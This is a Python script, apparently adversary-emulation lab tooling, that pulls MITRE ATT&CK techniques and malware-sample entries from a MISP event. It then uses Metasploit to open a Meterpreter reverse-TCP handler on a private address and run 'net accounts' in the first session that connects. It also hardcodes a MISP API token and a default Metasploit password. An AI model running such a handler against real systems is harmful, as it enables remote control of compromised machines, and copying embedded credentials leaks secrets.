from pymisp import PyMISP, MISPEvent
import json
import jmespath
from pymetasploit3.msfrpc import MsfRpcClient
from tenacity import retry, stop_after_delay, wait_fixed

msf_server = "127.0.0.1"
msf_password = "metasploit"

# Initialize MSF Connection
@retry(wait=wait_fixed(5))
def init_msf():
    try :
        client = MsfRpcClient(msf_password, port='55553', server=msf_server, ssl=True)
        print("[*]  Connected to Metasploit")
        return client
    except Exception as e:
        print("[-] Failed to connect to Metasploit")
        exit(0)
    return None

# Initialize MISP Connection
@retry(wait=wait_fixed(5))
def init_misp():
    misp_url = "http://localhost"
    misp_token="7uSxM3tnnyUfFGcPFqp1O92P90LsK6au3bFgVrPi"
    try:
        misp = PyMISP(misp_url, misp_token)
        print("[*]  Connected to MISP")
        return misp
    except Exception as e:
        print("[-] Failed to connect to MISP")
        exit(0)
    return None

# Read a given MISP event
def read_misp_event(misp, event_id):
    print()
    print(f"[*] Reading Event #{event_id}")
    event = misp.get_event(event_id)
    event = event['Event']

    attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
    event_galaxy_clusters = jmespath.search("Galaxy[].GalaxyCluster[]", event)
    object_galaxy_clusters = jmespath.search("Object[].Attribute[].Galaxy[].GalaxyCluster[]", event)
    payloads = jmespath.search("Object[].Attribute[?type=='malware-sample'][]", event)
    galaxy_clusters = object_galaxy_clusters + attribute_galaxy_clusters + event_galaxy_clusters

    # Get MITRE TTPs
    print()
    print("[*] Found below MITRE ATT&CK TTPs:")
    for item in galaxy_clusters:
        print(f"{item['value']}")

    # Get malware samples
    print()
    print("[*] Found below Malware Samples")
    for item in payloads:
        print(f"#{item['id']} : {item['value']}")

# Connect to meterpreter
@retry(stop=stop_after_delay(300))
def meterpreter_connect(client):
    print()
    print("[*] Configuring Metasploit Exploit...")
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = '192.168.56.3'
    payload['LPORT'] = '6001'

    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id)
    print("[*] Listening for connections...")
    console.run_module_with_output(exploit, payload=payload)

    print()
    print("[*] Running shell commands:\n")
    sessions = client.sessions.list
    session_1_key = list(sessions.keys())[0]
    session_1 = sessions[session_1_key]
    print(f"[*] Selecting Session {session_1_key}")
    shell = client.sessions.session(session_1_key)
    print(shell.run_shell_cmd_with_output("net accounts", None))  

def main():
    msf_client = init_msf()
    misp_client = init_misp()
    read_misp_event(misp_client, 4)
    meterpreter_connect(msf_client)

main()